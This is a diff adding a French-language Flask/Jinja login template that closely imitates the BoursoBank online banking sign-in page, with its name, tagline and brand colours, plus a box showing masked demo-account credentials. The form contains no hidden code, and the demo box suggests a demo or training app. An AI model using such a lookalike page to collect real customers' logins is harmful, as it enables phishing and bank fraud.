@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion - BoursoBank</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #E6007E 0%, #C20069 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-box {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+        }
+        .logo {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 800;
+            color: #E6007E;
+            margin-bottom: 8px;
+        }
+        .logo span { color: #1A1A2E; }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        h2 {
+            color: #1A1A2E;
+            font-size: 22px;
+            margin-bottom: 24px;
+            font-weight: 700;
+        }
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1A1A2E;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e5e5ea;
+            border-radius: 8px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: border 0.2s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #E6007E;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            background: #E6007E;
+            color: #fff;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #C20069; }
+        .flash {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            background: #ffebee;
+            color: #C62828;
+            border-left: 4px solid #D32F2F;
+        }
+        .demo-info {
+            margin-top: 24px;
+            padding: 14px;
+            background: #f5f5f7;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+        }
+        .demo-info strong { color: #E6007E; }
+        .links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        .links a {
+            color: #E6007E;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <div class="logo">Bourso<span>Bank</span></div>
+    <div class="subtitle">La banque en ligne nouvelle génération</div>
+
+    <h2>Connectez-vous</h2>
+
+    {% with messages = get_flashed_messages(with_categories=true) %}
+        {% for category, message in messages %}
+            <div class="flash">{{ message }}</div>
+        {% endfor %}
+    {% endwith %}
+
+    <form method="POST" action="{{ url_for('login') }}">
+        <div class="form-group">
+            <label for="identifiant">Identifiant client</label>
+            <input type="text" id="identifiant" name="identifiant" placeholder="Votre numéro client" required autofocus>
+        </div>
+        <div class="form-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+        </div>
+        <button type="submit" class="btn">Se connecter</button>
+    </form>
+
+    <div class="links">
+        <a href="#">Identifiant oublié ?</a> &nbsp;·&nbsp; <a href="#">Mot de passe oublié ?</a>
+    </div>
+
+    <div class="demo-info">
+        <strong>Compte de démonstration :</strong><br>
+        Identifiant : <strong>******</strong> &nbsp;|&nbsp; Mot de passe : <strong>******</strong>
+    </div>
+</div>
+
+</body>
+</html>
